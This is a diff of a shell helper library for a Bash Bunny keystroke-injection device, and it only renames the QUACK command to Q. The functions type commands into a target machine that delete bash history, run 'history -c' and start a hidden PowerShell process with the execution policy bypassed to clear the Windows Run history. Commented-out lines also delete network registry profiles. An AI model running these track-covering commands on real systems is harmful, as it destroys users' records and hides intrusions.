@@ -61,20 +61,20 @@ init_keyboard()
     fi
     debug_log "${KEYBOARD}"
     ${KEYBOARD}
-    QUACK DELAY 500
+    Q DELAY 500
 }
 
 clear_history_from_terminal()
 {
     if [ "$LINES" -gt "0" ]; then
-        QUACK STRING head -n -$LINES \$HOME/.bash_history
+        Q STRING head -n -$LINES \$HOME/.bash_history
         wait_enter_wait
-        QUACK STRING history -c
+        Q STRING history -c
         wait_enter_wait
     else
-        QUACK STRING rm \$HOME/.bash_history
+        Q STRING rm \$HOME/.bash_history
         wait_enter_wait
-        QUACK STRING history -c
+        Q STRING history -c
         wait_enter_wait
     fi
     debug_log "HISTORY CLEARED FROM TERMINAL"
@@ -85,11 +85,11 @@ clear_history_from_powershell()
     if [ "$LINES" -gt "0" ]; then
         # TODO: THIS CURRENTLY DELETES ALL HISTORY, IT SHOULD JUST REMOVE THE SPECIFIED NUMBER OF LINES
         # https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/smb_exfiltrator/payload.txt
-         QUACK STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+         Q STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
          wait_enter_wait
     else
     # https://github.com/hak5/bashbunny-payloads/blob/master/payloads/library/smb_exfiltrator/payload.txt
-     QUACK STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+     Q STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
      wait_enter_wait
     fi
     debug_log "HISTORY CLEARED FROM POWERSHELL"
@@ -97,7 +97,7 @@ clear_history_from_powershell()
 
 unmount_drive_from_mac()
 {
-    # QUACK STRING diskutil unmount /Volumes/BashBunny
+    # Q STRING diskutil unmount /Volumes/BashBunny
     # if lines > 0; lines + 1
     1=1
 }
@@ -105,12 +105,12 @@ unmount_drive_from_mac()
 remove_windows_network_adapters()
 {
     1=1
-    # QUACK STRING reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles /va /f
+    # Q STRING reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles /va /f
 
     # REMOVE EXTRA ETHERNET CONNECTIONS
-    # QUACK STRING netsh show profiles
+    # Q STRING netsh show profiles
     # todo ADAPTER=Get last ethernet adapter
-    # QUACK STRING netsh delete profile interface= $ADAPTER
+    # Q STRING netsh delete profile interface= $ADAPTER
 }
 
 debug_log "FUNCTIONS LOADED"
